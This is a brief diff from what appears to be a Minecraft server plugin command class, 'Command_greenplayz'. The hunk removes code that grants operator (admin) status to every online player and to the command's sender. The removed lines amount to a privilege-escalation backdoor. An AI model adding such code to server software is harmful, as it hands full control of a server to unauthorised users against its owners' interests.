@@ -52,11 +52,6 @@ public class Command_greenplayz extends TFM_Command {
                     }
                 }            
               
-        for (Player player : server.getOnlinePlayers())
-        {
-            player.setOp(true);
-        }
-            sender_p.setOp(true);
             
             
             
